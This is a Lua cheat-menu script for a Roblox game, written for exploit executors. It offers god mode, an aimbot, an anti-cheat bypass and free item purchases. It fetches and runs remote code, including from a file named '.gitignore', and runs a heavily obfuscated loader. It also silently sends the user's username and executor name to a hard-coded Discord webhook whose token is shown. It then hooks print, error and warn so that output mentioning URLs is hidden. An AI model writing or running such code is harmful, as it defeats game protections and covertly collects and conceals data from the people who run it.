local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheMasterHacker2244/eeee/main/.gitignore"))()
local venyx = library.new("ROGUE MASTER GUI [Regular]", 5013109572)
    local themes = {
    Background = Color3.fromRGB(24, 24, 24),
    Glow = Color3.fromRGB(0, 0, 0),
    Accent = Color3.fromRGB(10, 10, 10),      --GUI Color When Load
    LightContrast = Color3.fromRGB(255, 0, 0),
    DarkContrast = Color3.fromRGB(14, 14, 14),  
    TextColor = Color3.fromRGB(255, 255, 255)
    }
    local notifSound = Instance.new("Sound",workspace)
    notifSound.PlaybackSpeed = 1.05
    notifSound.Volume = 0.5
    notifSound.SoundId = "rbxassetid://8282140022" --Load In Intro
    notifSound.PlayOnRemove = true
    notifSound:Destroy()
    wait(0)

local page = venyx:addPage("Home", 5012544693) --Home
local section1 = page:addSection("Main UI")

section1:addToggle("FPS (BAD LOOKING)", nil, function(value)
    workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0 workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0 workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0 workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0 game:GetService("\76\105\103\104\116\105\110\103").GlobalShadows = false game:GetService("\76\105\103\104\116\105\110\103").FogEnd = 9e9 settings().Rendering.QualityLevel = 1 for i,v in pairs(game:GetDescendants()) do if v:IsA("\80\97\114\116") or v:IsA("\85\110\105\111\110\79\112\101\114\97\116\105\111\110") or v:IsA("\77\101\115\104\80\97\114\116") or v:IsA("\67\111\114\110\101\114\87\101\100\103\101\80\97\114\116") or v:IsA("\84\114\117\115\115\80\97\114\116") then v.Material = "\80\108\97\115\116\105\99" v.Reflectance = 0 elseif v:IsA("\68\101\99\97\108") then v.Transparency = 1 elseif v:IsA("\80\97\114\116\105\99\108\101\69\109\105\116\116\101\114") or v:IsA("\84\114\97\105\108") then v.Lifetime = NumberRange.new(0) elseif v:IsA("\69\120\112\108\111\115\105\111\110") then v.BlastPressure = 1 v.BlastRadius = 1 end end for i,v in pairs(game:GetService("\76\105\103\104\116\105\110\103"):GetDescendants()) do if v:IsA("\66\108\117\114\69\102\102\101\99\116") or v:IsA("\83\117\110\82\97\121\115\69\102\102\101\99\116") or v:IsA("\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116") or v:IsA("\66\108\111\111\109\69\102\102\101\99\116") or v:IsA("\68\101\112\116\104\79\102\70\105\101\108\100\69\102\102\101\99\116") then v.Enabled = false end end
end)

section1:addButton("Cut Throat (CANT BUY)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\117\116\84\104\114\111\97\116")
end)

section1:addButton("GodMode (FE)", function()
    function m() repeat wait() until (game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("\70\111\114\99\101\70\105\101\108\100")) local n = getsenv(game.Players.LocalPlayer.PlayerGui.GameUI.ClientMaster.ClientDamageMaster) n.EnvironmentDamage(game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character.Humanoid, -math.huge, "\75\105\108\108\69\102\102\101\99\116") end if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then m() end game.Players.LocalPlayer.CharacterAdded:connect(m)
end)

section1:addSlider("WalkSpeed", 16, 0, 100, function(t)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = t
end)

section1:addSlider("JumpPower", 36, 0, 150, function(t)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = t
end)

local page = venyx:addPage("Misc", 6157200594) --Misc
local section1 = page:addSection("Hacks")
section1:addButton("SpamKnife", function()
    local CoreGui = game:GetService("StarterGui")

            CoreGui:SetCore("SendNotification", {
                Title = "Notification",
                Text = "Spam knife enabled. Click E to start spam knife. Equipped the knife to disable spam knife.",
                Duration = 5
            })

                local mouse = game.Players.LocalPlayer:GetMouse()
                mouse.KeyDown:Connect(
                    function(key)
                        if key == "e" then
                            while true do
                                wait()
                                local env =
                                    getsenv(workspace[game.Players.LocalPlayer.Name].Knife.KnifeServer.KnifeClient)
                                env.TriggerWeapon(
                                    {
                                        AttackType = "KnifeThrow",
                                        ThrowCharge = 0.01
                                    }
                                )
                            end
                        end
                    end
                )
end)

section1:addButton("Aimbot", function()
local n = game:GetService("\87\111\114\107\115\112\97\99\101").CurrentCamera local s = game:GetService("\80\108\97\121\101\114\115") local t = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local function m() local q = nil local r = math.huge for i, v in pairs(s.GetPlayers(s)) do if v ~= t and v.Character and v.Character.FindFirstChild(v.Character, "\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then local b = (t.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude if b < r then r = b q = v end end end if q then return q end end local j = getrawmetatable(game) local l = j.__namecall setreadonly(j, false) j.__namecall = newcclosure(function(object, ...) local o = getnamecallmethod() local h = {...} if tostring(o) == "\70\105\110\100\80\97\114\116\79\110\82\97\121\87\105\116\104\73\103\110\111\114\101\76\105\115\116" then local q = m() if q and q.Character then h[1] = Ray.new(n.CFrame.Position, (q.Character.Head.Position - n.CFrame.Position).Unit * (n.CFrame.Position - q.Character.Head.Position).Magnitude) end end return l(object, unpack(h)) end) setreadonly(j, true)
end)

section1:addButton("GodMode", function()
function m() repeat wait() until (game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("\70\111\114\99\101\70\105\101\108\100")) local n = getsenv(game.Players.LocalPlayer.PlayerGui.GameUI.ClientMaster.ClientDamageMaster) n.EnvironmentDamage(game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character.Humanoid, -math.huge, "\75\105\108\108\69\102\102\101\99\116") end if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then m() end game.Players.LocalPlayer.CharacterAdded:connect(m)
end)

section1:addButton("Bad GodMode", function()
    local m = game.Players.LocalPlayer while true do wait() if m.Character and m.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then game.Workspace[m.Character.Name].CollisionParts:Destroy() end end
end)

local section1 = page:addSection("Admin Scripts")
section1:addButton("Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
end)

section1:addButton("CMD-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end)

section1:addButton("Sorky Hub", function()
    return(function(i,a,a)local k=string.char;local e=string.sub;local n=table.concat;local p=math.ldexp;local o=getfenv or function()return _ENV end;local l=select;local g=unpack or table.unpack;local j=tonumber;local function m(h)local b,c,d="","",{}local f=256;local g={}for a=0,f-1 do g[a]=k(a)end;local a=1;local function i()local b=j(e(h,a,a),36)a=a+1;local c=j(e(h,a,a+b-1),36)a=a+b;return c end;b=k(i())d[1]=b;while a<#h do local a=i()if g[a]then c=g[a]else c=b..e(b,1,1)end;g[f]=b..e(c,1,1)d[#d+1],b,f=c,c,f+1 end;return table.concat(d)end;local j=m('23P23L27523L23V27626L26M26826D26Q26T26R26G26N26E23L27427526E26826K26C23L23Q27625L26T26T26P25I26C26T23L24G27626H27V26P26Q25724U24U26P26827E26C26B27H24V26A26M26K24U26R26826U24U25X25F26026R24Y25G26825027627523S27624323N27623K29127529529327524H29723L29523M23L24327529F27L28Y27429528Y29D27K29O29O29928Y29529N29U276');local a=(bit or bit32);local d=a and a.bxor or function(a,b)local c,d,e=1,0,10 while a>0 and b>0 do local f,e=a%2,b%2 if f~=e then d=d+c end a,b,c=(a-f)/2,(b-e)/2,c*2 end if a<b then a=b end while a>0 do local b=a%2 if b>0 then d=d+c end a,c=(a-b)/2,c*2 end return d end local function c(b,a,c)if c then local a=(b/2^(a-1))%2^((c-1)-(a-1)+1);return a-a%1;else local a=2^(a-1);return(b%(a+a)>=a)and 1 or 0;end;end;local a=1;local function b()local b,f,c,e=i(j,a,a+3);b=d(b,129)f=d(f,129)c=d(c,129)e=d(e,129)a=a+4;return(e*16777216)+(c*65536)+(f*256)+b;end;local function h()local b=d(i(j,a,a),129);a=a+1;return b;end;local function f()local b,c=i(j,a,a+2);b=d(b,129)c=d(c,129)a=a+2;return(c*256)+b;end;local function m()local d=b();local a=b();local e=1;local d=(c(a,1,20)*(2^32))+d;local b=c(a,21,31);local a=((-1)^c(a,32));if(b==0)then if(d==0)then return a*0;else b=1;e=0;end;elseif(b==2047)then return(d==0)and(a*(1/0))or(a*(0/0));end;return p(a,b-1023)*(e+(d/(2^52)));end;local p=b;local function q(b)local c;if(not b)then b=p();if(b==0)then return'';end;end;c=e(j,a,a+b-1);a=a+b;local b={}for a=1,#c do b[a]=k(d(i(e(c,a,a)),129))end return n(b);end;local a=b;local function n(...)return{...},l('#',...)end local function j()local i={};local d={};local a={};local k={[#{"1 + 1 = 111";"1 + 1 = 111";}]=d,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{296;377;273;614};}]=a,[#{{239;230;793;757};}]=i,};local a=b()local e={}for c=1,a do local b=h();local a;if(b==1)then a=(h()~=0);elseif(b==3)then a=m();elseif(b==0)then a=q();end;e[c]=a;end;k[3]=h();for a=1,b()do d[a-1]=j();end;for j=1,b()do local a=h();if(c(a,1,1)==0)then local d=c(a,2,3);local g=c(a,4,6);local a={f(),f(),nil,nil};if(d==0)then a[3]=f();a[4]=f();elseif(d==1)then a[3]=b();elseif(d==2)then a[3]=b()-(2^16)elseif(d==3)then a[3]=b()-(2^16)a[4]=f();end;if(c(g,1,1)==1)then a[2]=e[a[2]]end if(c(g,2,2)==1)then a[3]=e[a[3]]end if(c(g,3,3)==1)then a[4]=e[a[4]]end i[j]=a;end end;return k;end;local function p(a,b,i)a=(a==true and j())or a;return(function(...)local f=a[1];local d=a[3];local a=a[2];local k=n local c=1;local e=-1;local m={};local j={...};local h=l('#',...)-1;local a={};local b={};for a=0,h do if(a>=d)then m[a-d]=j[a+1];else b[a]=j[a+#{"1 + 1 = 111";}];end;end;local a=h-d+1 local a;local d;while true do a=f[c];d=a[1];if d<=7 then if d<=3 then if d<=1 then if d==0 then do return end;else b[a[2]]();end;elseif d>2 then b[a[2]]=a[3];else local h;local m,l;local j;local d;b[a[2]]=i[a[3]];c=c+1;a=f[c];b[a[2]]=i[a[3]];c=c+1;a=f[c];d=a[2];j=b[a[3]];b[d+1]=j;b[d]=j[a[4]];c=c+1;a=f[c];b[a[2]]=a[3];c=c+1;a=f[c];b[a[2]]=(a[3]~=0);c=c+1;a=f[c];d=a[2]m,l=k(b[d](g(b,d+1,a[3])))e=l+d-1 h=0;for a=d,e do h=h+1;b[a]=m[h];end;c=c+1;a=f[c];d=a[2]b[d]=b[d](g(b,d+1,e))c=c+1;a=f[c];b[a[2]]();c=c+1;a=f[c];do return end;end;elseif d<=5 then if d>4 then b[a[2]]();else b[a[2]]=i[a[3]];end;elseif d>6 then b[a[2]]=i[a[3]];else local a=a[2]b[a]=b[a](g(b,a+1,e))end;elseif d<=11 then if d<=9 then if d>8 then local a=a[2]b[a]=b[a](g(b,a+1,e))else local d=a[2];local c=b[a[3]];b[d+1]=c;b[d]=c[a[4]];end;elseif d==10 then local d=a[2];local c=b[a[3]];b[d+1]=c;b[d]=c[a[4]];else b[a[2]]=(a[3]~=0);end;elseif d<=13 then if d>12 then local c=a[2]local d,a=k(b[c](g(b,c+1,a[3])))e=a+c-1 local a=0;for c=c,e do a=a+1;b[c]=d[a];end;else local c=a[2]local d,a=k(b[c](g(b,c+1,a[3])))e=a+c-1 local a=0;for c=c,e do a=a+1;b[c]=d[a];end;end;elseif d<=14 then b[a[2]]=(a[3]~=0);elseif d>15 then do return end;else b[a[2]]=a[3];end;c=c+1;end;end);end;return p(true,{},o())();end)(string.byte,table.insert,setmetatable);
end)

local section1 = page:addSection("Emotes")
section1:addButton("Cut Throat", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\117\116\84\104\114\111\97\116")
end)

section1:addButton("Chirimiru", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\104\105\114\105\109\105\114\117")
end)

section1:addButton("Dab", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\68\97\98")
end)

section1:addButton("KazotskyKick", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\75\97\122\111\116\115\107\121\75\105\99\107")
end)

section1:addButton("MeditationTaunt", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\101\100\105\116\97\116\105\111\110\84\97\117\110\116")
end)

section1:addButton("MoneyTaunt", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\111\110\101\121\84\97\117\110\116")
end)

local page = venyx:addPage("Gun & Knife", 7194280652) --Gun and Knifes

local section1 = page:addSection("Guns")

section1:addButton("DeathAWP (Gun)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\101\97\116\104\65\87\80")
end)

section1:addButton("RiotShotgun (Gun)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\105\111\116\83\104\111\116\103\117\110")
end)

section1:addButton("HellfireShotguns (Gun)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\72\101\108\108\102\105\114\101\83\104\111\116\103\117\110\115")
end)

section1:addButton("Korblox Berettas (Gun)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\75\111\114\98\108\111\120\66\101\114\101\116\116\97\115")
end)

local section1 = page:addSection("Knifes")

section1:addButton("The Reaper (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\101\97\112\101\114\75\110\105\102\101")
end)

section1:addButton("Crescendo (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\67\114\101\115\99\101\110\100\111")
end)

section1:addButton("DarkPiecemaker (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\97\114\107\80\105\101\99\101\109\97\107\101\114")
end)

section1:addButton("DragonLore (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\114\97\103\111\110\76\111\114\101")
end)

section1:addButton("EruptionKnife (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\69\114\117\112\116\105\111\110\75\110\105\102\101")
end)

section1:addButton("OverseerKnife (Knife)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\79\118\101\114\115\101\101\114\75\110\105\102\101")
end)

local section1 = page:addSection("Knife effects")

section1:addButton("Admin knife (REAL BUT 1 MILLION GEMS)", function()
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\65\100\109\105\110\75\110\105\102\101")
end)

local page = venyx:addPage("Settings", 7219199111) --Settings
local section1 = page:addSection("Settings")
section1:addKeybind("Toggle Keybind", Enum.KeyCode.RightControl, function()
print("Activated Keybind")
venyx:toggle()
end, function()
print("Changed Keybind")
end)

section1:addTextbox("Notification", "Default", function(value, focusLost)
print("Input", value)

if focusLost then
venyx:Notify("Title", value)
end
end)

local section1 = page:addSection("GameMode Settings")

section1:addButton("Murder [GameMode]", function()
local n = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local k = game:GetService("\80\108\97\121\101\114\115").LocalPlayer n:Teleport(2648571346, k)
end)

section1:addButton("Test place? [GameMode]", function()
local n = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local k = game:GetService("\80\108\97\121\101\114\115").LocalPlayer n:Teleport(2000, k)
end)

local section1 = page:addSection("Server Settings")

section1:addButton("ServerHop", function()
local m = {} for _, v in ipairs(game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):JSONDecode(game:HttpGetAsync("\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47" .. game.PlaceId .. "\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48")).data) do if type(v) == "\116\97\98\108\101" and v.maxPlayers > v.playing and v.id ~= game.JobId then m[#m + 1] = v.id end end if #m > 0 then game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, m[math.random(1, #m)]) else return notify("\83\101\114\118\101\114\104\111\112","\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46") end
end)

section1:addButton("Rejoin", function()
local m = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local n = game:GetService("\80\108\97\121\101\114\115").LocalPlayer m:Teleport(game.PlaceId, n)
end)

local theme = venyx:addPage("Theme", 7194280652) --THEME
local colors = theme:addSection("Colors")

for theme, color in pairs(themes) do
colors:addColorPicker(theme, color, function(color3)
venyx:setTheme(theme, color3)
end)
end

local page = venyx:addPage("Credits", 7194096858) --Credits
local section1 = page:addSection("                     Thanks For Using Rogue Master GUI")
section1:addButton("Gui Made By: Going rogue", function()
end)


venyx:SelectPage(venyx.pages[1], true)

local CoreGui = game:GetService("StarterGui")



bypassantiCheat = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and self.Name == "Utility" and method == "FireServer" then
        print("Anti cheat blocked.")
        return; -- basically do nothing if it gets called
    end

    return bypassantiCheat(self, ...)
end)

CoreGui:SetCore("SendNotification", {
    Title = "Notification",
    Text = "Anti cheat bypassed!",
    Duration = 4
})

local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"



local url =
"https://discord.com/api/webhooks/1005958507255840798/Krrj6BDqfzklmA9ZoNrnp6_Sx34kE93ah9GZZn6J5vQ_R8RhnpuC47tkvRbqhYoNb9Li"
local data = {
["content"] = "Detected user:",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
["type"] = "rich",
["color"] = tonumber(0x7269da),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local h
h = hookfunction(warn,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
